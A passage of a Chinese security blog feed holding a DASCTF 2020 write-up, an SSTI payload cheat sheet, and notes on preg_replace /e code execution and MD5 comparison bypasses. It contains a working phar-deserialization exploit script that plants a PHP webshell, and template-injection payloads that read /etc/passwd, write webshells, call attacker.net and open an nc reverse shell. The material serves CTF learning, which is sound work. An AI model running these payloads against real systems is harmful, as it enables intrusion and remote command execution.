title="image-20201228193214814"><p>可以看到第一个是正常的文件，第二个是触发phar反序列化写入的.php文件，蚁剑连上，到根目录执行<code>/readflag</code>即可。</p><img src="/article/dasctf2020/image-20201228193429000.png" class="" title="image-20201228193429000"><p>所以直接读是不可以的，<code>400</code>没有权限，需要执行<code>/readflag</code>。</p><p>最后附上exp</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/25 14:24@Auth ： gyy@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> osbaseurl <span class="token operator">=</span> <span class="token string">"http://8.129.41.25:10305/"</span><span class="token keyword">def</span> <span class="token function">phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    php <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?phpclass Template&#123;    public $content;    public $pattern;    public $suffix;    public function __construct()&#123;        $this->content = "&#123;&#123;gyycoming&#125;&#125;";        $this->pattern = "/&#123;&#123;([a-z]+)&#125;&#125;/";        $this->suffix = ".php";    &#125;    public function __destruct() &#123;        $this->render();    &#125;    public function render() &#123;        while (True) &#123;            if(preg_match($this->pattern, $this->content, $matches)!==1)                break;            global $&#123;$matches[1]&#125;;            if(isset($&#123;$matches[1]&#125;)) &#123;                $this->content = preg_replace($this->pattern, $&#123;$matches[1]&#125;, $this->content);            &#125;            else&#123;                break;            &#125;        &#125;        if(strlen($this->suffix)>5) &#123;            echo "error suffix";            die();        &#125;        $filename = '/var/www/html/uploads/' . md5($_SERVER['REMOTE_ADDR']) . "/" . md5($this->content) . $this->suffix;        file_put_contents($filename, $this->content);        echo "Your html file is in " . $filename;    &#125;&#125;$phar = new Phar('phar.phar');$phar -> stopBuffering();$phar -> setStub('&lt;?php __HALT_COMPILER();?>');$phar -> addFromString('test.txt','test');$object = new Template();$phar -> setMetadata($object);$phar -> stopBuffering();?>'''</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'phar.php'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>php<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.php is create'</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'php phar.php'</span><span class="token punctuation">)</span>    a<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.phar is create'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] create phar file wrong."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">up_phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?tp=1&amp;var[template][1]=php://input"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        pharfile <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>pharfile<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file to ----> "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"/var/www/html/"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        upurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token builtin">str</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] upload pharfile error."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phar_trigger</span><span class="token punctuation">(</span>upurl<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?var[template][1]=phar://"</span><span class="token operator">+</span>upurl<span class="token operator">+</span><span class="token string">"&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?>"</span>    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res1<span class="token punctuation">)</span>    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"shell file ----> "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">".php"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        shellurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellurl<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> shellurl    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] trigger pharfile error."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"gyy"</span> <span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"system('/readflag');"</span>    phar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    upurl <span class="token operator">=</span> up_phar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    shellurl <span class="token operator">=</span> phar_trigger<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    shell<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span> payload<span class="token punctuation">)</span></code></pre><hr><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><hr><h4 id="马老师的秘籍"><a href="#马老师的秘籍" class="headerlink" title="马老师的秘籍"></a>马老师的秘籍</h4><p>签到题</p><img src="/article/dasctf2020/image-20201228193732975.png" class="" title="image-20201228193732975"><p>首先拿到一张图片，随便扫了一个，竟然是招式名称…不过既然是题目，图片肯定不止是图片…用十六进制查看，底部发现了zip标志头<code>50 4D 03 04</code></p><img src="/article/dasctf2020/image-20201228193923701.png" class="" title="image-20201228193923701"><p>用foremost提前或者直接拖到最后新建十六进制文件搞出来，是个压缩包</p><img src="/article/dasctf2020/image-20201228194027067.png" class="" title="image-20201228194027067"><p>有加密，所以检查一下，发现有伪加密，直接修改加密位拖出来jpg文件，其他两个是真加密</p><img src="/article/dasctf2020/image-20201228194144848.png" class="" title="image-20201228194144848"><p>图片很花，不过依稀能看出来东西的</p><img src="/article/dasctf2020/image-20201228194307542.png" class="" title="image-20201228194307542"><p>所以利用Stegsolve，把这张和原图异或一下即可</p><img src="/article/dasctf2020/image-20201228194456072.png" class="" title="image-20201228194456072"><p><code>md5(NianQingRenBuJiangWuDe)</code></p><p>那这串去解密真加密文件<code>c57988283c92f759585a0c1aebfdd743</code>，密码正确。</p><p>这里有人说明文攻击也行…没跑过，大概可以吧。</p><p>文本文件里一堆<code>左正蹬 右鞭腿 左刺拳</code>，第二个里面</p><pre class="language-none"><code class="language-none">左正蹬 -&gt; .右鞭腿 -&gt; !左刺拳 -&gt; ?</code></pre><p>很显然，替换。替换完后只有<code>.!?</code>，推测为Ook!加密，直接去解，得到flag</p><img src="/article/dasctf2020/image-20201228195508111.png" class="" title="image-20201228195508111"><hr><h4 id="FakePic"><a href="#FakePic" class="headerlink" title="FakePic"></a>FakePic</h4><p>RAR压缩包注释提示密码为1???小写字母，共四位</p><img src="/article/dasctf2020/image-20201228195736671.png" class="" title="image-20201228195736671"><p>输出个字典用ARPA准备跑，结果提示这不是个RAR文件，则为RAR5格式，利用hashcat破解，得到密码<code>1cpp</code></p><p>解压后一个图片一个提示</p><pre class="language-none"><code class="language-none">10132430取最前面500位就行</code></pre><p>Stegsolve分析一波无果，提示也一头雾水。最后在十六进制查看在文件末尾时发现提示</p><img src="/article/dasctf2020/image-20201228195943508.png" class="" title="image-20201228195943508"><p>分析到这没做了，电脑有问题没装上PIL模块。</p><p>赛后参考<a href="https://l1near.top/index.php/2020/12/27/87.html">大师傅博客</a>，利用脚本跑出Alpha通道前几个点，发现</p><img src="/article/dasctf2020/image-20201228203355447.png" class="" title="image-20201228203355447"><p> 都是2的倍数，且倍数都不大。结合前面的提示（而且提示的长度还为8）。那么就猜测提示的作用是这样的：<code>10132430</code>得这样分<code>1 0 1 3 2 4 3 0</code>，然后这8个为一轮一直循环。如果刚好轮到这个数，算出来的<code>pow(2,x)</code>和Alpha通道的值一样，那么就为1，否则就为0。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagepic <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">)</span>width<span class="token punctuation">,</span>height <span class="token operator">=</span> pic<span class="token punctuation">.</span>sizeflag <span class="token operator">=</span> <span class="token string">""</span>z <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>i <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> z <span class="token operator">&lt;=</span> <span class="token number">500</span><span class="token punctuation">:</span>            z <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span>z <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> pic<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token string">'1'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token string">'0'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>跑出来<codecode></p><p>去二进制转字符串，得到flag</p><img src="/article/dasctf2020/image-20201228203737416.png" class="" title="image-20201228203737416"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是太菜了，有些点还是比较生疏，重点学习了一波phar反序列化，继续学习。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入</title>
      <link href="article/ssti/"/>
      <url>article/ssti/</url>
      
        <content type="html"><![CDATA[<p>SSTI模板注入</p><a id="more"></a><h1 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h1><h2 id="什么是模板注入"><a href="#什么是模板注入" class="headerlink" title="什么是模板注入"></a>什么是模板注入</h2><p> SSTI （服务器端模板注入）也是格式化字符串的一个非常好的例子，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是。这种模板不仅存于Python中，PHP中也有不少模板引擎。</p><h2 id="检测流程"><a href="#检测流程" class="headerlink" title="检测流程"></a>检测流程</h2><img src="/article/ssti/SSTI%E6%B5%81%E7%A8%8B.png" class="" title="SSTI流程"><p>首先输入<code>&#123;&#123;7*7&#125;&#125;</code>，返回值为<code>49</code>则表明存在SSTI</p><p>输入<code>&#123;&#123;system('cat /etc/passwd')&#125;&#125;</code>如果返回值则表明为<strong>Smarty模板引擎</strong></p><p>输入<code>&#123;&#123;7*'7'&#125;&#125;</code>如果返回值是<code>49</code>则为<strong>Twig模板引擎</strong></p><p>如果返回值是<code>7777777</code>则为<strong>JinJa模板引擎</strong></p><hr><h2 id="姿势总结"><a href="#姿势总结" class="headerlink" title="姿势总结"></a>姿势总结</h2><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>payload：</p><pre class="language-none"><code class="language-none">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;&#123;literal&#125;alert(&#39;xss&#39;);&#123;&#x2F;literal&#125;&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</code></pre><h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;etc&#x2F;passwd&quot;)&#125;&#125;&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;cat &#x2F;etc&#x2F;passwd&quot;) &#125;</code></pre><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</code></pre><h3 id="Jinja"><a href="#Jinja" class="headerlink" title="Jinja"></a>Jinja</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;&#x2F;&#x2F;写文件&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;&#x2F;&#x2F;加载system&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;&#x2F;&#x2F;执行命令反弹SHELL</code></pre><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>payload:</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:port&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>preg_replace与代码执行</title>
      <link href="article/preg_replace/"/>
      <url>article/preg_replace/</url>
      
        <content type="html"><![CDATA[<p>参考文章链接： <a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a> </p><a id="more"></a><h1 id="preg-replace与代码执行"><a href="#preg-replace与代码执行" class="headerlink" title="preg_replace与代码执行"></a>preg_replace与代码执行</h1><p> <strong>preg_replace</strong> <strong>/e</strong> 模式下的代码执行问题 </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">')/ei'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'strtolower("\\1")'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p> <strong>preg_replace</strong> 使用了 <strong>/e</strong> 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。 </p><p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串.</p><p>上面的命令执行，相当于 <strong>eval(‘strtolower(“\1”);’)</strong> 结果，当中的 <strong>\1</strong> 实际上就是 <strong>\1</strong> ，而 <strong>\1</strong> 在正则表达式中有自己的含义。</p><blockquote><p><strong>反向引用</strong></p><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><p> <strong>payload</strong> 为： <strong>/?.*={${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>/?.*</strong> ，值为 <strong>{${phpinfo()}}</strong> 。 </p><pre class="language-none"><code class="language-none">$re&#x3D;.*$str&#x3D;&#123;$&#123;phpinfo()&#125;&#125;原先的语句： preg_replace(&#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $str);变成了语句： preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;phpinfo()&#125;&#125;);</code></pre><hr><p> 由于在PHP中，对于传入的非法的 <strong>$_GET</strong> 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。 </p><p> 当非法字符为首字母时，只有点号会被替换成下划线，所以我们要做的就是换一个正则表达式，让其匹配到 <strong>{${phpinfo()}}</strong> 即可执行 <strong>phpinfo</strong> 函数。<strong>payload</strong> ： <strong>\S*=${phpinfo()}</strong> </p><p> 为什么要匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 <strong>phpinfo</strong> 函数，这是一个小坑。这实际上是 <a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。 </p><p>文章链接： <a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a> </p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>md5比较</title>
      <link href="article/md5/"/>
      <url>article/md5/</url>
      
        <content type="html"><![CDATA[<p>MD5弱类型比较，强类型比较以及真实碰撞</p><a id="more"></a><h1 id="MD5比较类型"><a href="#MD5比较类型" class="headerlink" title="MD5比较类型"></a>MD5比较类型</h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>弱类型比较因为php特性，0e开头会被识别为科学计数法，结果0=0比较成功</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>b<span class="token operator">=</span>aabg7XSs</code></pre><p>只要是md5值为0e开头即可</p><hr><h2 id="强比较类型"><a href="#强比较类型" class="headerlink" title="强比较类型"></a>强比较类型</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>强类型比较用数组绕过，md5()函数无法解出其数值，就会得到===强比较值相等</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">111</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>aaa</code></pre><p>传入数组即可</p><hr><h2 id="真实碰撞"><a href="#真实碰撞" class="headerlink" title="真实碰撞"></a>真实碰撞</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>真实md5碰撞，由于string()函数，不能输入数组只能输入字符串</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token 